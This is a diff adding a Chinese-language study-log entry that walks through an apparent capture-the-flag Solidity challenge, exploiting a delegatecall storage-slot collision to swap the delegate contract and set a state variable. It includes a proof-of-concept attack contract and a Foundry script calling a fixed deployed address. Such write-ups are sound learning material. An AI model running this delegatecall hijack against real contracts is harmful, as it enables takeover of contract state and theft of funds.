@@ -15,6 +15,52 @@ timezone: UTC+8
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-09
+
+# 题目分析
+看一遍这个源码，首先是注意到这个delegatecall。然后我看到两个合约插槽的对齐，还有delegatecall的方式，先委托合约这个setnumber()函数，改变0槽和1槽，0槽是直接指定改变，1槽是一长串计算，暂且不管他。主合约的0槽存放的是委托合约的地址，让我想起之前做的delegatecall漏洞题，是把委托合约换成我们的攻击合约地址，而这里也正好符合，那么大概第一步思路就是先调用第一遍delegatecall，更新主合约0槽的委托合约地址为我们的攻击合约，然后构思一下我们的攻击合约，写一个同名的函数，这样再delegatecall就会执行我们写的这个同名函数的代码逻辑，这就是攻击要点。
+issolved()要求的num==target，可以看到target可以在第一遍delegatecall的时候指定，因为两个合约的target槽是对齐的，然后我们再在我们写的攻击合约，把num的槽和主合约的num槽对齐就可以，然后在同名函数里赋值和target一样的值就可以了。
+攻击步骤
+1. 写一个攻击合约，槽位与主合约对齐，内里写个setnumber()函数，把槽3的num设为调用函数输入的参数
+2. 先调用一次delegatecall，设target的值（这里是直接设置的主函数的target，不涉及delegatecall），把委托合约换成我们的攻击合约地址
+3. 再次delegatecall，设num的值，和上边第一步target一样即可，这样就是进入的我们攻击合约那个同名函数的逻辑，给num赋值（这里是delegatecall，但因为槽位对齐，所以主函数也是num被赋值）
+4. target和num数值相同，通过issolved
+poc
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.0;
+
+import {BigNaiLong} from "./nailong.sol";
+
+contract Attack {
+    address public a; // 0
+    uint256 public b; // 1，前两个槽不重要，只是为了对齐3槽凑数来的
+    uint256 public number; // 2
+
+    function setnumber(uint256 _num) public {
+        number = _num;
+    }
+}
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.0;
+
+import {Attack} from "../src/Attack.sol";
+import {BigNaiLong} from "../src/nailong.sol";
+import {Script} from "forge-std/Script.sol";
+
+contract Attacksc is Script {
+    function run() external {
+        vm.startBroadcast();
+        Attack attack = new Attack();
+        BigNaiLong bignailong = BigNaiLong(
+            0x7B2c3C15DfEe33980ca8528e6BF7826eECf6eE27
+        );
+        bignailong.setnailong(7, uint256(uint160(address(attack))));//第一次delegatecall，把委托合约换成我们的攻击合约地址，赋值target==7
+        bignailong.setnailong(7, 7);//第二次delegatecall，连接上的就是我们的攻击合约，把num也赋值成7，就能通过issolved的检查
+        require(bignailong.isSolved(), "no");
+        vm.stopBroadcast();
+    }
+}
+
 # 2025-08-08
 
 EOA检测绕过
